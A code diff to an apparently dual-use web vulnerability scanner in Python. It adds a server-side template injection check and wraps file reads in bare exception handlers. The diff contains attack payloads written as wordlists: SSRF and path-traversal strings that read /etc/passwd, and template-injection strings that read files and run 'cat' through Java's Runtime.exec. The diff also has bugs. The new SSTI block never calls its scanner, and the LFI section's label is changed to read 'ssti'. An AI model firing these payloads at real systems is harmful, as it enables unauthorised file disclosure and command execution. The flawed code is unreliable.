@@ -15,6 +15,7 @@ from scanners.scan_idor import idor
 from scanners.scan_lfi  import lfi
 from scanners.scan_sqli import sqli
 from scanners.scan_ssrf import ssrf
+from scanners.scan_ssti import ssti
 from urllib.error import URLError, HTTPError
 from colorama import Back, Fore, init
 init()
@@ -38,7 +39,7 @@ br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.
 ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
 
 
-def scan(U,c,cl,h,x,l,s,i,sr,output,fname,o,vulnerables_urls):
+def scan(U,c,cl,h,x,l,s,i,sr,sst,output,fname,o,vulnerables_urls):
     if 'http://' in U:
         pass
     elif 'https://' in U:
@@ -99,12 +100,15 @@ def scan(U,c,cl,h,x,l,s,i,sr,output,fname,o,vulnerables_urls):
         uri=[]
         wordlist=['"><script>confirm(1)</script>']
         parametizer(U,output)
-        with open(output, "r") as f:
+        try:
+         with open(output, "r") as f:
                 for q in f.readlines():
                     q = q.strip()
                     if q == "" or q.startswith("#"):
                         continue
                     uri.append(q)            
+        except:
+             pass
         print()        
         print('\033[1;33mTest xss for default payload:\033[0m')
         print()        
@@ -113,13 +117,16 @@ def scan(U,c,cl,h,x,l,s,i,sr,output,fname,o,vulnerables_urls):
     if i:
         uri=[]
         wordlist=['']
-        parametizer(U,output) 
-        with open(output, "r") as f:
+        parametizer(U,output)
+        try: 
+         with open(output, "r") as f:
                 for i in f.readlines():
                     i = i.strip()
                     if i == "" or i.startswith("#"):
                         continue
                     uri.append(i)            
+        except:
+             pass
         print()        
         print('\033[1;33mSearch idor parameters:\033[0m')
         print()
@@ -130,48 +137,71 @@ def scan(U,c,cl,h,x,l,s,i,sr,output,fname,o,vulnerables_urls):
         uri=[]
         wordlist=["'"]
         parametizer(U,output) 
-        with open(output, "r") as f:
+        try:
+         with open(output, "r") as f:
                 for i in f.readlines():
                     i = i.strip()
                     if i == "" or i.startswith("#"):
                         continue
                     uri.append(i)            
+        except:
+             pass
         print()        
         print('\033[1;33mTest sql for default payload:\033[0m')
         print()
         sqli(uri,wordlist,vulnerables_urls)     
     
-
     if sr:
         uri=[]
-        wordlist=['']
+        wordlist=['file:///etc/passwd','file://\/\/etc/passwd','netdoc:///etc/passwd']
         parametizer(U,output) 
-        with open(output, "r") as f:
+        try:
+         with open(output, "r") as f:
                 for i in f.readlines():
                     i = i.strip()
                     if i == "" or i.startswith("#"):
                         continue
                     uri.append(i)            
+        except:
+             pass
         print()        
-        print('\033[1;33Seach SSRF parameters:\033[0m')
+        print('\033[1;33mTest SSRF for default payloads:\033[0m')
         print()
         ssrf(uri,wordlist,vulnerables_urls)
 
     if l:
         uri=[]
         wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']
-        parametizer(U,output) 
-        with open(output, "r") as f:    
+        parametizer(U,output)
+        try: 
+         with open(output, "r") as f:    
                 for i in f.readlines():
                     i = i.strip()
                     if i == "" or i.startswith("#"):
                         continue
                     uri.append(i)            
+        except:
+             pass
         print()        
-        print('\033[1;33mTest lfi for default payload:\033[0m')
+        print('\033[1;33mTest ssti for default payload:\033[0m')
         print()
         lfi(uri,wordlist,vulnerables_urls)
-
+    if sst:
+        uri=[]
+        wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]
+        parametizer(U,output)
+        try: 
+         with open(output, "r") as f:    
+                for i in f.readlines():
+                    i = i.strip()
+                    if i == "" or i.startswith("#"):
+                        continue
+                    uri.append(i)            
+        except:
+             pass
+        print()        
+        print('\033[1;33mTest ssti for default payload:\033[0m')
+        print()
     if o:
      save_output(vulnerables_urls,fname,U)
 
